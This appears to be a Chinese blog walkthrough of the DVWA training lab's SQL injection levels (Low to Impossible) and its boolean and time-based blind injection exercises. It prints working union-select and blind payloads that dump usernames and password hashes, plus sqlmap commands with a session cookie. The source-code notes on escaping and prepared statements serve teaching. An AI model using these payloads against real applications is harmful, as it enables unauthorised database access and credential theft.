        <h4 id="首先判断是否存在注入且注入类型"   >
          <a href="#首先判断是否存在注入且注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#首先判断是否存在注入且注入类型" class="headerlink" title="首先判断是否存在注入且注入类型"></a>首先判断是否存在注入且注入类型</h4>
      <p>输入一个数字1，查询成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211514062.png" alt="image-20240521151423024"></p>
<p>输入1’，返回错误，说明存在SQL注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211515222.png" alt="image-20240521151510181"></p>
<p>再试试1’or ‘1’=’1，查询成功，说明是字符型注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211516022.png" alt="image-20240521151620992"></p>

        <h4 id="查看列数"   >
          <a href="#查看列数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br><span class="line">&#x27; union select 1,2,3;#</span><br></pre></td></tr></table></div></figure>

<p>依次尝试，发现只有两列</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211522744.png" alt="image-20240521152233711"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211523383.png" alt="image-20240521152307352"></p>

        <h4 id="获取当前数据库"   >
          <a href="#获取当前数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>

<p>发现数据库名称为dvwa </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211549055.png" alt="image-20240521154916026"></p>

        <h4 id="获取数据表名"   >
          <a href="#获取数据表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211550951.png" alt="image-20240521155037919"></p>

        <h4 id="查看表字段名"   >
          <a href="#查看表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211552757.png" alt="image-20240521155230718"></p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>

        <h4 id="查看字段内容"   >
          <a href="#查看字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(user,password) from dvwa.users;#</span><br></pre></td></tr></table></div></figure>

<p>可以看的users表中所有用户的user、password的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211556881.png" alt="image-20240521155658847"></p>

        <h3 id="Sqlmap"   >
          <a href="#Sqlmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3>
      
        <h4 id="获取当前数据库-1"   >
          <a href="#获取当前数据库-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241330520.png" alt="image-20240524133052476"></p>

        <h4 id="获取数据库表名"   >
          <a href="#获取数据库表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241331421.png" alt="image-20240524133140382"></p>

        <h4 id="查看表字段名-1"   >
          <a href="#查看表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-1" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241332189.png" alt="image-20240524133224149"></p>

        <h4 id="查看字段内容-1"   >
          <a href="#查看字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-1" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241333134.png" alt="image-20240524133321086"></p>
<p>查看源代码发现对输入没有什么限制</p>

        <h2 id="Medium-6"   >
          <a href="#Medium-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211600670.png" alt="image-20240521160040637"></p>
<p>界面上只能下拉来改变输入</p>
<p>尝试使用HackBar来用POST方法提交数据</p>

        <h4 id="判断注入类型"   >
          <a href="#判断注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入1，页面能正常返回查询到的数据</p>
<p>有&amp;Submit=Submit的原因：网页基于检测特定的提交按钮来触发相应的数据库操作或其他逻辑的。如果不包括这个参数，服务器端的脚本可能不会执行期望的操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211636361.png" alt="image-20240521163641322"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211637282.png" alt="image-20240521163715255"></p>
<p>输入1’or ‘1’=’1，报错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211641567.png" alt="image-20240521164115536"></p>
<p>输入1 or 1 = 1，返回了所有数据，说明是数字型注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211642588.png" alt="image-20240521164209548"></p>

        <h4 id="查看列数-1"   >
          <a href="#查看列数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-1" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入1 order by 1，从1一直试直到报错，即可获得字段数，直到3报错，所以列数为2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211643275.png" alt="image-20240521164353245"></p>

        <h4 id="获取当前数据库-2"   >
          <a href="#获取当前数据库-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库-2" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,database();</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-1"   >
          <a href="#获取数据库表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-1" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p>但是报错，再换一个方式</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221101651.png" alt="image-20240522110132595"></p>

        <h4 id="查看表字段名-2"   >
          <a href="#查看表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-2" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p>又报错，查看信息发现是’被转义成了&#39;，所以上一步也会报错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211655692.png" alt="image-20240521165521659"></p>
<p>可以转换成十六进制，user转换成十六进制为0x7573657273</p>
<p>因此输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273;#</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看字段内容-2"   >
          <a href="#查看字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-2" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(user,password) from dvwa.users;#</span><br></pre></td></tr></table></div></figure>



<p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211707114.png" alt="image-20240521170706087"></p>
<p>使用<code>mysqli_real_escape_string</code> 函数，通过对字符串中的特定字符进行转义处理，在特定字符前添加反斜线 <code>\</code> ，特定字符包括’、”、\、NUL 字符、\n、\r、\x1A(在 Windows 系统中，Control-Z (<code>\x1A</code>) 被解释为文件结束标记)</p>

        <h2 id="High-6"   >
          <a href="#High-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-6" class="headerlink" title="High"></a>High</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211718721.png" alt="image-20240521171834684"></p>
<p>点击是一个新窗口，可以在里面输入数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211719285.png" alt="image-20240521171902252"></p>
<p>步骤和Low相同</p>
<p>关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211721487.png" alt="image-20240521172121454"></p>
<p>从 SESSION 获取 id 值，所以这里不能直接在当前页面注入，<code>LIMIT 1</code> 的作用是确保查询结果最多只返回一条记录</p>

        <h2 id="Impossible-6"   >
          <a href="#Impossible-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211732457.png" alt="image-20240521173224409"></p>
<p>依然是用令牌来防止CSRF攻击，并且检测id是否为数字，使用 PDO 预处理语句来防止SQL注入攻击</p>

        <h1 id="八、SQL注入（盲注）"   >
          <a href="#八、SQL注入（盲注）" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、SQL注入（盲注）" class="headerlink" title="八、SQL注入（盲注）"></a>八、SQL注入（盲注）</h1>
      
        <h2 id="Low-7"   >
          <a href="#Low-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908607.png" alt="image-20240522090817496"></p>
<p>输入1，返回信息存在，但是没有显示出具体的信息，可以判断是盲注</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908944.png" alt="image-20240522090844910"></p>

        <h3 id="布尔盲注"   >
          <a href="#布尔盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3>
      
        <h4 id="判断注入类型-1"   >
          <a href="#判断注入类型-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入1’ or ‘1’ = ‘1，返回错误，所以是字符型的注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220909854.png" alt="image-20240522090936814"></p>

        <h4 id="查看列数-2"   >
          <a href="#查看列数-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-2" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1;#</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br></pre></td></tr></table></div></figure>

<p>依次尝试，发现输入到3时会报错，所以列数为2列</p>

        <h4 id="获取数据库名"   >
          <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
      
        <h5 id="获取数据库名称长度"   >
          <a href="#获取数据库名称长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;20;#</span><br></pre></td></tr></table></div></figure>

<p>返回不存在，说明数据库名称长度小于20</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220913553.png" alt="image-20240522091335512"></p>
<p>按二分法思维一直判断数据库名称长度，最后可以获取到长度为4</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220915719.png" alt="image-20240522091518676"></p>

        <h5 id="获取数据库名称"   >
          <a href="#获取数据库名称" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;65;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1"   >
          <a href="#substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1" class="headerlink" title="substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1"></a>substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1</h6>
      
        <h6 id="ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值"   >
          <a href="#ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值" class="heading-link"><i class="fas fa-link"></i></a><a href="#ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值" class="headerlink" title="ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值"></a>ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220918767.png" alt="image-20240522091832725"></p>
<p>所以第一个字符的ASCII码值大于65，再接着不断尝试，得到第一个字符的ASCII码值为100，即d，按此方法获取数据库第二个第三个第四个字符的ASCII码，最终得到数据库名称为dvwa</p>

        <h4 id="获取数据库表名-2"   >
          <a href="#获取数据库表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-2" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      
        <h5 id="获取表的数量"   >
          <a href="#获取表的数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database()) &lt;5;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="count-table-name-用于统计满足特定条件的行数（这里即表的数量）"   >
          <a href="#count-table-name-用于统计满足特定条件的行数（这里即表的数量）" class="heading-link"><i class="fas fa-link"></i></a><a href="#count-table-name-用于统计满足特定条件的行数（这里即表的数量）" class="headerlink" title="count(table_name) 用于统计满足特定条件的行数（这里即表的数量）"></a>count(table_name) 用于统计满足特定条件的行数（这里即表的数量）</h6>
      <p>返回存在，即表的数量少于5</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220929877.png" alt="image-20240522092952842"></p>
<p>不断尝试获取到表的数量为2</p>

        <h5 id="分别获取两个表的表名长度"   >
          <a href="#分别获取两个表的表名长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) &gt; 10;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名"   >
          <a href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名" class="headerlink" title="(select table_name from information_schema.tables where table_schema=database() limit 0,1) 用于从信息模式中选择第一个表名"></a>(select table_name from information_schema.tables where table_schema=database() limit 0,1) 用于从信息模式中选择第一个表名</h6>
      
        <h6 id="limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…"   >
          <a href="#limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…" class="heading-link"><i class="fas fa-link"></i></a><a href="#limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…" class="headerlink" title="limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果…."></a>limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果….</h6>
      <p>返回查找失败，说明第一个表名长度小于10</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220932207.png"></p>
<p>不断尝试获取到第一个表名长度为9，第二个表名长度为5</p>

        <h5 id="分别获取两个表的表名"   >
          <a href="#分别获取两个表的表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100;#</span><br></pre></td></tr></table></div></figure>

<p> 返回存在，说明第一个表的第一个字符的ASCII码值大于100</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220939543.png" alt="image-20240522093910508"></p>
<p>最终获得表名依次为guestbook，users</p>

        <h4 id="获取字段名"   >
          <a href="#获取字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4>
      
        <h5 id="获取users表中字段的数量"   >
          <a href="#获取users表中字段的数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;10;#</span><br></pre></td></tr></table></div></figure>

<p>返回不存在，说明字段数量小于10</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220953882.png" alt="image-20240522095302848"></p>
<p>尝试后获得字段数量为8</p>

        <h5 id="获取每个字段的字段长度"   >
          <a href="#获取每个字段的字段长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))&gt;10;#</span><br></pre></td></tr></table></div></figure>

<p>返回不存在，说明一个字段的字段长度小于10</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221001894.png" alt="image-20240522100158864"></p>
<p>最终获得每个字段的字段长度为7，10，9，4，8，6，10，12</p>

        <h5 id="获取字段名-1"   >
          <a href="#获取字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))&gt;100;#</span><br></pre></td></tr></table></div></figure>

<p>返回存在，所以第一个字段的ASCII码值大于100</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221010692.png" alt="image-20240522101036656"></p>
<p>继续尝试，得到字段名分别为user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>

        <h3 id="时间盲注"   >
          <a href="#时间盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>
      
        <h4 id="判断注入类型-2"   >
          <a href="#判断注入类型-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-2" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5);#</span><br></pre></td></tr></table></div></figure>

<p>有明细的延迟</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and sleep(5);#</span><br></pre></td></tr></table></div></figure>

<p>没有延迟，说明为字符型注入</p>

        <h4 id="获取数据库名-1"   >
          <a href="#获取数据库名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
      
        <h5 id="获取数据库名称长度-1"   >
          <a href="#获取数据库名称长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度-1" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>


        <h6 id="if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值"   >
          <a href="#if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值" class="heading-link"><i class="fas fa-link"></i></a><a href="#if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值" class="headerlink" title="if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值"></a>if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值</h6>
      <p>页面没有延迟，说明数据库名长度不为1</p>
<p>慢慢尝试，得到数据库名长度为4</p>

        <h5 id="获取数据库名称-1"   >
          <a href="#获取数据库名称-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称-1" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
      <p>判断第一个字符，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;90,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明数据库名第一个字符的ascii码值大于90</p>
<p>慢慢尝试得到数据库名为dvwa</p>

        <h4 id="获取数据库表名-3"   >
          <a href="#获取数据库表名-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-3" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      
        <h5 id="获取表的数量-1"   >
          <a href="#获取表的数量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量-1" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明表的数量为2</p>

        <h5 id="分别获取两个表的表名长度-1"   >
          <a href="#分别获取两个表的表名长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度-1" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
      <p>获取第一个表表名长度，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第一个表名长度为9</p>
<p>同理获取到第二个表表名长度为5</p>

        <h5 id="分别获取两个表的表名-1"   >
          <a href="#分别获取两个表的表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名-1" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
      <p>获取第一个表表名，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明表名的第一个字符的ASCII码值大于100</p>
